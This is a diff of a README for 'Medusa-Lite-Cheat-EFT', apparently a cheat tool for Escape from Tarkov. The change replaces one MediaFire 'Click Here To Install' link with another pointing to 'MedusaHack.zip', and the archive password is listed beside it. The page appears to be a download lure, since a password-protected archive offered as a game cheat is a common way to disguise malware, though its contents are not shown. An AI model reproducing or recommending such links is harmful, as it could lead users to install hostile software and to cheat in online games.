@@ -1,6 +1,6 @@
 # Medusa-Lite-Cheat-EFT
 
-[Click Here To Install](https://www.mediafire.com/file/ykzmt7y86ndulao/MedusaEFT.zip/file)
+[Click Here To Install](https://www.mediafire.com/file/00gmu4z9r2dclt2/MedusaHack.zip/file)
 [Pass - MedusaEFTcheat]
 
 ![image](https://github.com/user-attachments/assets/b126fb56-f547-4600-a89b-2b8764449d46)
